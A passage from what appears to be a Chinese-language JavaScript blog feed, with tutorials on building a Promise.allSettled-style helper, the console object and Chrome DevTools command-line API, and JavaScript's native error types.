src="/Blog/2020/05/28/javascript/%E6%89%8B%E5%86%99Promise%EF%BC%8CA+%E8%A7%84%E8%8C%83/index/img.png"></p><p>第一步，解决 <code>Promise.all</code> 其中一个失败就返回的问题</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 既然失败就会返回，我们干脆直接让所有的 Promise 都成功就好了</span></span><br><span class="line">const x = <span class="function"><span class="params">promise</span> =&gt;</span> promise.then(<span class="function"><span class="params">data</span> =&gt;</span> (&#123; <span class="attr">status</span>: <span class="string">&#x27;ok&#x27;</span>, data &#125;), data =&gt; (&#123; <span class="attr">status</span>: <span class="string">&#x27;not ok&#x27;</span>, data &#125;))</span><br><span class="line">const task1 = <span class="function"><span class="params">()</span> =&gt;</span> Promise.reject(<span class="number">1111</span>)</span><br><span class="line">const task2 = <span class="function"><span class="params">()</span> =&gt;</span> Promise.reject(<span class="number">2222</span>)</span><br><span class="line">const task3 = <span class="function"><span class="params">()</span> =&gt;</span> Promise.resolve(<span class="number">3333</span>)</span><br><span class="line">Promise.<span class="built_in">all</span>([x(task1()), x(task2()), x(task3())]).then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(data))</span><br></pre></td></tr></table></figure><h4 id="运行："><a href="#运行：" class="headerlink" title="运行："></a>运行：</h4><p><img src="/Blog/2020/05/28/javascript/%E6%89%8B%E5%86%99Promise%EF%BC%8CA+%E8%A7%84%E8%8C%83/index/img_1.png"></p><blockquote><p>已经得到和 <code>Promise.settled</code> 一样的结果了，接下来我们再优化一下代码</p></blockquote><h5 id="辅助函数-x-接受一个-promise-数组"><a href="#辅助函数-x-接受一个-promise-数组" class="headerlink" title="辅助函数 x 接受一个 promise 数组"></a>辅助函数 x 接受一个 promise 数组</h5><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x = promiseList =&gt; promiseList.<span class="keyword">map</span>(promise =&gt; promise.<span class="keyword">then</span>(data =&gt; (&#123; status: <span class="string">&#x27;ok&#x27;</span>, data &#125;), data =&gt; (&#123; status: <span class="string">&#x27;not ok&#x27;</span>, data &#125;)))</span><br><span class="line"><span class="regexp">// 对比上一步的 x</span></span><br><span class="line"><span class="regexp">//</span> <span class="keyword">const</span> x = promise =&gt; promise.<span class="keyword">then</span>(data =&gt; (&#123; status: <span class="string">&#x27;ok&#x27;</span>, data &#125;), data =&gt; (&#123; status: <span class="string">&#x27;not ok&#x27;</span>, data &#125;))</span><br><span class="line"><span class="keyword">const</span> task1 = () =&gt; <span class="built_in">Promise</span>.reject(<span class="number">1111</span>)</span><br><span class="line"><span class="keyword">const</span> task2 = () =&gt; <span class="built_in">Promise</span>.reject(<span class="number">2222</span>)</span><br><span class="line"><span class="keyword">const</span> task3 = () =&gt; <span class="built_in">Promise</span>.resolve(<span class="number">3333</span>)</span><br><span class="line"><span class="built_in">Promise</span>.all(x([task1(), task2(), task3()])).<span class="keyword">then</span>(data =&gt; console.log(data))</span><br></pre></td></tr></table></figure><h4 id="运行：-1"><a href="#运行：-1" class="headerlink" title="运行："></a>运行：</h4><p><img src="/Blog/2020/05/28/javascript/%E6%89%8B%E5%86%99Promise%EF%BC%8CA+%E8%A7%84%E8%8C%83/index/img_2.png"></p><h3 id="最后一步"><a href="#最后一步" class="headerlink" title="最后一步"></a>最后一步</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const x = <span class="function"><span class="params">promiseList</span> =&gt;</span> promiseList.<span class="built_in">map</span>(<span class="function"><span class="params">promise</span> =&gt;</span> promise.then(<span class="function"><span class="params">data</span> =&gt;</span> (&#123; <span class="attr">status</span>: <span class="string">&#x27;ok&#x27;</span>, data &#125;), data =&gt; (&#123; <span class="attr">status</span>: <span class="string">&#x27;not ok&#x27;</span>, data &#125;)))</span><br><span class="line">Promise.settled2 = <span class="function"><span class="params">promiseList</span> =&gt;</span> Promise.<span class="built_in">all</span>(x(promiseList))</span><br><span class="line">const task1 = <span class="function"><span class="params">()</span> =&gt;</span> Promise.reject(<span class="number">1111</span>)</span><br><span class="line">const task2 = <span class="function"><span class="params">()</span> =&gt;</span> Promise.reject(<span class="number">2222</span>)</span><br><span class="line">const task3 = <span class="function"><span class="params">()</span> =&gt;</span> Promise.resolve(<span class="number">3333</span>)</span><br><span class="line">Promise.settled2([task1(), task2(), task3()]).then(<span class="function"><span class="params">data</span> =&gt;</span> <span class="built_in">console</span>.<span class="built_in">log</span>(data))</span><br></pre></td></tr></table></figure><h4 id="运行：-2"><a href="#运行：-2" class="headerlink" title="运行："></a>运行：</h4><p><img src="/Blog/2020/05/28/javascript/%E6%89%8B%E5%86%99Promise%EF%BC%8CA+%E8%A7%84%E8%8C%83/index/img_3.png"></p><p>end。</p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>console 对象与控制台</title>
      <link href="/Blog/2020/04/21/chrome_debug/console%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%8E%A7%E5%88%B6%E5%8F%B0/index/"/>
      <url>/Blog/2020/04/21/chrome_debug/console%E5%AF%B9%E8%B1%A1%E4%B8%8E%E6%8E%A7%E5%88%B6%E5%8F%B0/index/</url>
      
        <content type="html"><![CDATA[<h3 id="console-对象的静态方法"><a href="#console-对象的静态方法" class="headerlink" title="console 对象的静态方法"></a>console 对象的静态方法</h3><p><code>console.log</code>方法用于在控制台输出信息。它可以接受一个或多个参数，将它们连接起来输出。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Hello World&#x27;</span>)</span><br><span class="line"><span class="comment">// Hello World</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line"><span class="comment">// a b c</span></span><br></pre></td></tr></table></figure><p><code>console.log</code>方法会自动在每次输出的结尾，添加换行符。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">1</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="comment">// 3</span></span><br></pre></td></tr></table></figure><p>如果第一个参数是格式字符串（使用了格式占位符），<code>console.log</code>方法将依次用后面的参数替换占位符，然后再进行输出。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27; %s + %s = %s&#x27;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">//  1 + 1 = 2</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>console.log</code>方法的第一个参数有三个占位符（<code>%s</code>），第二、三、四个参数会在显示时，依次替换掉这个三个占位符。</p><p><code>console.log</code>方法支持以下占位符，不同类型的数据必须使用对应的占位符。</p><ul><li><code>%s</code> 字符串</li><li><code>%d</code> 整数</li><li><code>%i</code> 整数</li><li><code>%f</code> 浮点数</li><li><code>%o</code> 对象的链接</li><li><code>%c</code> CSS 格式字符串</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">number</span> = <span class="number">11</span> * <span class="number">9</span>;</span><br><span class="line"><span class="keyword">var</span> color = <span class="string">&#x27;red&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;%d %s balloons&#x27;</span>, <span class="built_in">number</span>, color);</span><br><span class="line"><span class="comment">// 99 red balloons</span></span><br></pre></td></tr></table></figure><p>上面代码中，第二个参数是数值，对应的占位符是<code>%d</code>，第三个参数是字符串，对应的占位符是<code>%s</code>。</p><p>使用%c占位符时，对应的参数必须是 CSS 代码，用来对输出内容进行 CSS 渲染。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">console.<span class="built_in">log</span>(</span><br><span class="line">  &#x27;%cThis text <span class="built_in">is</span> styled!&#x27;,</span><br><span class="line">  &#x27;<span class="built_in">color</span>: red; <span class="built_in">background</span>: yellow; <span class="built_in">font</span>-size: 24px;&#x27;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>上面代码运行后，输出的内容将显示为黄底红字。</p><p><code>console.log</code>方法的两种参数格式，可以结合在一起使用。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27; %s + %s &#x27;</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="string">&#x27;= 2&#x27;</span>)</span><br><span class="line"><span class="comment">// 1 + 1  = 2</span></span><br></pre></td></tr></table></figure><h3 id="console-count"><a href="#console-count" class="headerlink" title="console.count()"></a>console.count()</h3><p><code>count</code>方法用于计数，输出它被调用了多少次。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> greet(user) &#123;</span><br><span class="line">  console.count();</span><br><span class="line">  return <span class="string">&#x27;hi &#x27;</span> + user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;bob&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span>  : <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&quot;hi bob&quot;</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;alice&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span>  : <span class="number">2</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&quot;hi alice&quot;</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;bob&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span>  : <span class="number">3</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&quot;hi bob&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码每次调用<code>greet</code>函数，内部的<code>console.count</code>方法就输出执行次数。</p><p>该方法可以接受一个字符串作为参数，作为标签，对执行次数进行分类。4</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> greet(user) &#123;</span><br><span class="line">  console.count(user);</span><br><span class="line">  return <span class="string">&quot;hi &quot;</span> + user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;bob&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span> bob: <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&quot;hi bob&quot;</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;alice&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span> alice: <span class="number">1</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&quot;hi alice&quot;</span></span><br><span class="line"></span><br><span class="line">greet(<span class="string">&#x27;bob&#x27;</span>)</span><br><span class="line"><span class="regexp">//</span> bob: <span class="number">2</span></span><br><span class="line"><span class="regexp">//</span> <span class="string">&quot;hi bob&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码根据参数的不同，显示<code>bob</code>执行了两次，<code>alice</code>执行了一次。</p><h3 id="console-time-，console-timeEnd"><a href="#console-time-，console-timeEnd" class="headerlink" title="console.time()，console.timeEnd()"></a>console.time()，console.timeEnd()</h3><p>这两个方法用于计时，可以算出一个操作所花费的准确时间。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.time(<span class="string">&#x27;Array initialize&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">array</span>= <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="built_in">array</span>.<span class="built_in">length</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">  <span class="built_in">array</span>[i] = <span class="keyword">new</span> Object();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.timeEnd(<span class="string">&#x27;Array initialize&#x27;</span>);</span><br><span class="line"><span class="comment">// Array initialize: 1914.481ms</span></span><br></pre></td></tr></table></figure><p><code>time</code>方法表示计时开始，<code>timeEnd</code>方法表示计时结束。它们的参数是计时器的名称。调用<code>timeEnd</code>方法之后，控制台会显示“计时器名称: 所耗费的时间”。</p><h3 id="console-group-，console-groupEnd-console-groupCollapsed"><a href="#console-group-，console-groupEnd-console-groupCollapsed" class="headerlink" title="console.group()，console.groupEnd(),console.groupCollapsed()"></a>console.group()，console.groupEnd(),console.groupCollapsed()</h3><p><code>console.group</code>和<code>console.groupEnd</code>这两个方法用于将显示的信息分组。它只在输出大量信息时有用，分在一组的信息，可以用鼠标折叠&#x2F;展开。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.group(<span class="string">&#x27;一级分组&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;一级分组的内容&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.group(<span class="string">&#x27;二级分组&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;二级分组的内容&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.groupEnd(); <span class="comment">// 二级分组结束</span></span><br><span class="line"><span class="built_in">console</span>.groupEnd(); <span class="comment">// 一级分组结束</span></span><br></pre></td></tr></table></figure><p>上面代码会将“二级分组”显示在“一级分组”内部，并且“一级分组”和“二级分组”前面都有一个折叠符号，可以用来折叠本级的内容。</p><p><code>console.groupCollapsed</code>方法与<code>console.group</code>方法很类似，唯一的区别是该组的内容，在第一次显示时是收起的（<code>collapsed</code>），而不是展开的。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.groupCollapsed(<span class="string">&#x27;Fetching Data&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Request Sent&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.error(<span class="string">&#x27;Error: Server not responding (500)&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.groupEnd();</span><br></pre></td></tr></table></figure><p>上面代码只显示一行”Fetching Data“，点击后才会展开，显示其中包含的两行。</p><h3 id="console-trace-，console-clear"><a href="#console-trace-，console-clear" class="headerlink" title="console.trace()，console.clear()"></a>console.trace()，console.clear()</h3><p><code>console.trace</code>方法显示当前执行的代码在堆栈中的调用路径。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">console.trace()</span><br><span class="line"><span class="regexp">//</span> console.trace()</span><br><span class="line"><span class="regexp">//</span>   (anonymous <span class="keyword">function</span>)</span><br><span class="line"><span class="regexp">//</span>   InjectedScript._evaluateOn</span><br><span class="line"><span class="regexp">//</span>   InjectedScript._evaluateAndWrap</span><br><span class="line"><span class="regexp">//</span>   InjectedScript.evaluate</span><br></pre></td></tr></table></figure><p><code>console.clear</code>方法用于清除当前控制台的所有输出，将光标回置到第一行。如果用户选中了控制台的“Preserve log”选项，<code>console.clear</code>方法将不起作用。</p><h1 id="控制台命令行-API"><a href="#控制台命令行-API" class="headerlink" title="控制台命令行 API"></a>控制台命令行 API</h1><h3 id=""><a href="#" class="headerlink" title="$_"></a>$_</h3><p><code>$_</code>属性返回上一个表达式的值。</p><figure class="highlight plaintext"><figcaption><span>+ 2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 4</span><br><span class="line">$_</span><br><span class="line">// 4</span><br></pre></td></tr></table></figure><h3 id="selector"><a href="#selector" class="headerlink" title="$(selector)"></a>$(selector)</h3><p><code>$(selector)</code>返回第一个匹配的元素，等同于<code>document.querySelector()</code>。注意，如果页面脚本对<code>$</code>有定义，则会覆盖原始的定义。比如，页面里面有 jQuery，控制台执行<code>$(selector)</code>就会采用 jQuery 的实现，返回一个数组。</p><h3 id="selector-1"><a href="#selector-1" class="headerlink" title="$$(selector)"></a>$$(selector)</h3><p><code>$$(selector)</code>返回选中的 DOM 对象，等同于<code>document.querySelectorAll</code>。</p><h3 id="x-path"><a href="#x-path" class="headerlink" title="$x(path)"></a>$x(path)</h3><p><code>$x(path)</code>方法返回一个数组，包含匹配特定 <code>XPath</code> 表达式的所有 DOM 元素。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$x(<span class="string">&quot;//p[a]&quot;</span>)</span><br></pre></td></tr></table></figure><p>上面代码返回所有包含<code>a</code>元素的<code>p</code>元素。</p><h3 id="getEventListeners-object"><a href="#getEventListeners-object" class="headerlink" title="getEventListeners(object)"></a>getEventListeners(object)</h3><p><code>getEventListeners(object)</code>方法返回一个对象，该对象的成员为object登记了回调函数的各种事件（比如<code>click</code>或<code>keydown</code>），每个事件对应一个数组，数组的成员为该事件的回调函数。</p><h3 id="monitorEvents-object-events-，unmonitorEvents-object-events"><a href="#monitorEvents-object-events-，unmonitorEvents-object-events" class="headerlink" title="monitorEvents(object[, events]) ，unmonitorEvents(object[, events])"></a>monitorEvents(object[, events]) ，unmonitorEvents(object[, events])</h3><p><code>monitorEvents(object[, events])</code>方法监听特定对象上发生的特定事件。事件发生时，会返回一个<code>Event</code>对象，包含该事件的相关信息。<code>unmonitorEvents</code>方法用于停止监听。</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">monitor<span class="constructor">Events(<span class="params">window</span>, <span class="string">&quot;resize&quot;</span>)</span>;</span><br><span class="line">monitor<span class="constructor">Events(<span class="params">window</span>, [<span class="string">&quot;resize&quot;</span>, <span class="string">&quot;scroll&quot;</span>])</span></span><br></pre></td></tr></table></figure><p>上面代码分别表示单个事件和多个事件的监听方法。</p><p><code>monitorEvents</code>允许监听同一大类的事件。所有事件可以分成四个大类。</p><ul><li>mouse：”mousedown”, “mouseup”, “click”, “dblclick”, “mousemove”, “mouseover”, “mouseout”, “mousewheel”</li><li>key：”keydown”, “keyup”, “keypress”, “textInput”</li><li>touch：”touchstart”, “touchmove”, “touchend”, “touchcancel”</li><li>control：”resize”, “scroll”, “zoom”, “focus”, “blur”, “select”, “change”, “submit”, “reset”<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">monitorEvents($(<span class="string">&quot;#msg&quot;</span>), <span class="string">&quot;key&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>上面代码表示监听所有<code>key</code>大类的事件。</li></ul><blockquote><p>命令行 API 还提供以下方法。</p><p>clear()：清除控制台的历史。<br>copy(object)：复制特定 DOM 元素到剪贴板。<br>dir(object)：显示特定对象的所有属性，是console.dir方法的别名。<br>dirxml(object)：显示特定对象的 XML 形式，是console.dirxml方法的别名。</p></blockquote><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>Chrome Developer Tools, <a href="https://developers.google.com/chrome-developer-tools/docs/console">Using the Console</a></li><li>Matt West, <a href="http://blog.teamtreehouse.com/mastering-developer-tools-console">Mastering The Developer Tools Console</a></li><li>Firebug Wiki, <a href="https://getfirebug.com/wiki/index.php/Console_API">Console API</a></li><li>Axel Rauschmayer, <a href="http://www.2ality.com/2013/10/console-api.html">The JavaScript console API</a></li><li>Marius Schulz, <a href="http://blog.mariusschulz.com/2013/11/13/advanced-javascript-debugging-with-consoletable">Advanced JavaScript Debugging with console.table()</a></li><li>Google Developer, <a href="https://developers.google.com/chrome-developer-tools/docs/commandline-api">Command Line API Reference</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> chrome调试技巧 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>错误处理机制</title>
      <link href="/Blog/2020/04/21/javascript/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/index/"/>
      <url>/Blog/2020/04/21/javascript/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6/index/</url>
      
        <content type="html"><![CDATA[<h1 id="Error-实例对象"><a href="#Error-实例对象" class="headerlink" title="Error 实例对象"></a>Error 实例对象</h1><blockquote><p>JavaScript 解析或运行时，一旦发生错误，引擎就会抛出一个错误对象。JavaScript 原生提供 <code>Error</code>构造函数，所有抛出的错误都是这个构造函数的实例。</p></blockquote><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> err = <span class="keyword">new</span> <span class="type">Error</span>(<span class="string">&#x27;出错了&#x27;</span>);</span><br><span class="line">err.message <span class="comment">// &quot;出错了&quot;</span></span><br></pre></td></tr></table></figure><p>上面代码中，我们调用Error构造函数，生成一个实例对象err。Error构造函数接受一个参数，表示错误提示，可以从实例的message属性读到这个参数。抛出Error实例对象以后，整个程序就中断在发生错误的地方，不再往下执行。</p><p>JavaScript 语言标准只提到，<code>Error</code>实例对象必须有<code>message</code>属性，表示出错时的提示信息，没有提到其他属性。大多数 <code>JavaScript</code> 引擎，对<code>Error</code>实例还提供<code>name</code>和<code>stack</code>属性，分别表示错误的名称和错误的堆栈，但它们是非标准的，不是每种实现都有。</p><ul><li>message：错误提示信息</li><li>name：错误名称（非标准属性）</li><li>stack：错误的堆栈（非标准属性）<br>使用<code>name</code>和<code>message</code>这两个属性，可以对发生什么错误有一个大概的了解。</li></ul><h1 id="原生错误类型"><a href="#原生错误类型" class="headerlink" title="原生错误类型"></a>原生错误类型</h1><blockquote><p><code>Error</code>实例对象是最一般的错误类型，在它的基础上，JavaScript 还定义了其他6种错误对象。也就是说，存在<code>Error</code>的<code>6</code>个派生对象。</p></blockquote><h3 id="SyntaxError-对象"><a href="#SyntaxError-对象" class="headerlink" title="SyntaxError 对象"></a>SyntaxError 对象</h3><blockquote><p><code>SyntaxError</code>对象是解析代码时发生的语法错误。</p></blockquote><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 变量名错误</span></span><br><span class="line"><span class="keyword">var</span> <span class="number">1</span>a;</span><br><span class="line"><span class="comment">// Uncaught SyntaxError: Invalid or unexpected token</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 缺少括号</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span> <span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="comment">// Uncaught SyntaxError: Unexpected string</span></span><br></pre></td></tr></table></figure><p>上面代码的错误，都是在语法解析阶段就可以发现，所以会抛出<code>SyntaxError</code>。第一个错误提示是“token 非法”，第二个错误提示是“字符串不符合要求”。</p><h3 id="ReferenceError-对象"><a href="#ReferenceError-对象" class="headerlink" title="ReferenceError 对象"></a>ReferenceError 对象</h3><blockquote><p><code>ReferenceError</code>对象是引用一个不存在的变量时发生的错误。</p></blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">//</span> 使用一个不存在的变量</span><br><span class="line">unknownVariable</span><br><span class="line"><span class="regexp">//</span> Uncaught ReferenceError: unknownVariable is not defined</span><br></pre></td></tr></table></figure><p>另一种触发场景是，将一个值分配给无法分配的对象，比如对函数的运行结果赋值。</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 等号左侧不是变量</span></span><br><span class="line"><span class="built_in">console</span>.<span class="built_in">log</span>() = <span class="number">1</span></span><br><span class="line"><span class="comment">// Uncaught ReferenceError: Invalid left-hand side in assignment</span></span><br></pre></td></tr></table></figure><p>上面代码对函数<code>console.log</code>的运行结果赋值，结果引发了<code>ReferenceError</code>错误。</p><h3 id="RangeError-对象"><a href="#RangeError-对象" class="headerlink" title="RangeError 对象"></a>RangeError 对象</h3><blockquote><p><code>RangeError</code>对象是一个值超出有效范围时发生的错误。主要有几种情况，一是数组长度为负数，二是<code>Number</code>对象的方法参数超出范围，以及函数堆栈超过最大值。</p></blockquote><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 数组长度不得为负数<span class="built_in"></span></span><br><span class="line"><span class="built_in">new </span>Array(-1)</span><br><span class="line">// Uncaught RangeError: Invalid<span class="built_in"> array </span>length</span><br></pre></td></tr></table></figure><h3 id="TypeError-对象"><a href="#TypeError-对象" class="headerlink" title="TypeError 对象"></a>TypeError 对象</h3><blockquote><p><code>TypeError</code>对象是变量或参数不是预期类型时发生的错误。比如，对字符串、布尔值、数值等原始类型的值使用<code>new</code>命令，就会抛出这种错误，因为<code>new</code>命令的参数应该是一个构造函数。</p></blockquote><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="type">123</span></span><br><span class="line"><span class="comment">// Uncaught TypeError: number is not a func</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line">obj.unknownMethod()</span><br><span class="line"><span class="comment">// Uncaught TypeError: obj.unknownMethod is not a function</span></span><br></pre></td></tr></table></figure><p>上面代码的第二种情况，调用对象不存在的方法，也会抛出<code>TypeError</code>错误，因为<code>obj.unknownMethod</code>的值是<code>undefined</code>，而不是一个函数。</p><h3 id="URIError-对象"><a href="#URIError-对象" class="headerlink" title="URIError 对象"></a>URIError 对象</h3><blockquote><p><code>URIError</code>对象是 <code>URI</code> 相关函数的参数不正确时抛出的错误，主要涉及<code>encodeURI()</code>、<code>decodeURI()</code>、<code>encodeURIComponent()</code>、<code>decodeURIComponent()</code>、<code>escape()</code>和<code>unescape()</code>这六个函数。</p></blockquote><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">decodeURI</span><span class="params">(<span class="string">&#x27;%2&#x27;</span>)</span></span></span><br><span class="line"><span class="comment">// URIError: URI malformed</span></span><br></pre></td></tr></table></figure><h3 